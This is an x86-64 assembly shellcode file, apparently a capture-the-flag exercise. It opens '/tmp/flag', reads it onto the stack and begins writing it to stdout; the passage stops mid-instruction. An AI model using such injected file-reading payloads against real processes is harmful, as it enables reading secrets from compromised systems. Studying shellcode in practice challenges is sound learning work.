;Name: orw.S

push 0x67
mov rax, 0x616c662f706d742f	;"/tmp/flag"
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
sub rsi, 0x30	; important
mov rdx, 0x30
mov rax, 0x0
syscall

mov rdi, 1
mov rax,0x1
mov 
